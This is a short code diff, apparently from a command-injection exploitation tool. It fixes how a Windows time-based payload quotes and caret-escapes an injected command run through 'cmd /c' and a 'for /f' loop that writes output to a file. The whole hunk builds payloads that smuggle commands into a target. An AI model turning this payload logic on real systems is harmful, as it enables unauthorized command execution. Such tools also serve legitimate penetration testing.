@@ -270,8 +270,12 @@ def cmd_execution_alter_interpreter(separator, cmd, j, OUTPUT_TEXTFILE, timesec,
     chain = checks.windows_separator(separator)
     if chain is not None:
       python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print(len(file.read().strip()))\""
+      # Written in quoted, the way the results-based payload writes its own. Unquoted, cmd.exe took
+      # a '^' of the command's for its own escape and dropped it with no number of them bringing it
+      # back - measured against a cmd.exe, one, two, three and four carets all arrived as none,
+      # while the quoted form carries a doubled one as the character it was.
       payload = (chain +
-                "for /f \"tokens=* eol=\" %i in ('cmd /c " + cmd + "') do " +
+                "for /f \"tokens=* eol=\" %i in ('cmd /c \"" + checks.caret_escaped(cmd) + "\"') do " +
                 settings.WIN_FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + " '%i'" +
                 checks.windows_probe(checks.WINDOWS_CHAIN, python_payload, "EQU", j, timesec)
                 )
